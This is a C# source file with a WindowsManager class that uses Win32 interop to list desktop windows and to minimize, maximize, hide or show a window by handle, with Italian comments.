using System;
using System.Runtime.InteropServices;
using System.Text;

namespace bc.srv.Muduli.System_Info
{
    internal class WindowsManager
    {
        public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);


        [DllImport("user32.dll", EntryPoint = "GetWindowText",
            ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpWindowText, int nMaxCount);


        [DllImport("user32.dll", EntryPoint = "EnumDesktopWindows",
            ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction,
            IntPtr lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ShowWindow(IntPtr hWnd, WindowStyle nCmdShow);


        [DllImport("user32.dll", SetLastError = true)]
        private static extern int CloseWindow(IntPtr hWnd);


        /// <summary>
        ///     Stringa con tutte le finestre. Formato:
        ///     NOMEFINESTRA|HANDLE|VISIBILE*
        /// </summary>
        /// <returns></returns>
        public string GetWindows()
        {
            try
            {
                var exitStr = "";
                EnumDelegate filter = delegate(IntPtr hWnd, int lParam)
                {
                    var strbTitle = new StringBuilder(255);
                    var nLength = GetWindowText(hWnd, strbTitle, strbTitle.Capacity + 1);
                    var strTitle = strbTitle.ToString();

                    if (!string.IsNullOrEmpty(strTitle))
                        exitStr += string.Format("{0}|{1}|{2}*", strTitle, hWnd, IsWindowVisible(hWnd));

                    return true;
                };

                if (EnumDesktopWindows(IntPtr.Zero, filter, IntPtr.Zero))
                    exitStr = exitStr.TrimEnd('*');


                return exitStr;
            }
            catch
            {
                return null;
            }
        }


        /// <summary>
        ///     Minimizza La finestra specificata
        /// </summary>
        /// <param name="handle"></param>
        /// <returns></returns>
        public int MinimizeWindow(int handle)
        {
            try
            {
                var iptrHandle = (IntPtr) handle;

                //int res = CloseWindow(iptrHandle); ;

                var test = ShowWindow(iptrHandle, WindowStyle.Minimize);

                var res = 1;

                return res;
            }
            catch
            {
                return -1;
            }
        }


        /// <summary>
        ///     Massimizza La finestra specificata
        /// </summary>
        /// <param name="handle"></param>
        /// <returns></returns>
        public int MaximizeWindow(int handle)
        {
            try
            {
                var iptrHandle = (IntPtr) handle;

                var test = ShowWindow(iptrHandle, WindowStyle.ShowMaximized);

                var res = 1;

                return res;
            }
            catch
            {
                return -1;
            }
        }

        /// <summary>
        ///     Nasconde La finestra specificata
        /// </summary>
        /// <param name="handle"></param>
        /// <returns></returns>
        public int HideWindow(int handle)
        {
            try
            {
                var iptrHandle = (IntPtr) handle;

                var test = ShowWindow(iptrHandle, WindowStyle.Hide);

                var res = 1;

                return res;
            }
            catch
            {
                return -1;
            }
        }

        /// <summary>
        ///     Show La finestra specificata
        /// </summary>
        /// <param name="handle"></param>
        /// <returns></returns>
        public int ShowWindow(int handle)
        {
            try
            {
                var iptrHandle = (IntPtr) handle;

                var test = ShowWindow(iptrHandle, WindowStyle.ShowNormal);

                var res = 1;

                return res;
            }
            catch
            {
                return -1;
            }
        }
    }
}